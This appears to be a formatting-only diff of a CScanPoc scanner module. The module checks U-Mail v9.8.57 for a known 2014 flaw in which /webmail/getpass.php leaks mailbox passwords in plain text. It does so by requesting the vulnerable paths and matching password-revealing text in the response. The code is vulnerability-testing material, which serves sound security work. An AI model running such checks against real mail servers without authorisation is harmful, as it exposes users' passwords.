@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'U-Mail_0001' # 平台漏洞编号，留空
+    vuln_id = 'U-Mail_0001'  # 平台漏洞编号，留空
     name = 'U-Mail v9.8.57 /getpass.php 信息泄漏漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2014-05-22'  # 漏洞公布时间
     desc = '''
         U-Mail /webmail/getpass.php 邮箱明文密码泄露。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'U-Mail'  # 漏洞应用名称
     product_version = 'v9.8.57'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'b3654e90-63dc-4b1f-b7ee-92e908927b52'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             # After a successful attack, modify the email parameters for the target mailbox
             vul_paths = [
                 '/webmail/getpass.php',
@@ -45,7 +47,8 @@ class Poc(ABPoc):
                 req = urllib2.Request(verify_url)
                 try:
                     content = urllib2.urlopen(req).read()
-                    m = re.compile(r'Your password is|你的密碼是|你的密码是').findall(content)
+                    m = re.compile(
+                        r'Your password is|你的密碼是|你的密码是').findall(content)
                 except:
                     continue
                 if m:
@@ -57,6 +60,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
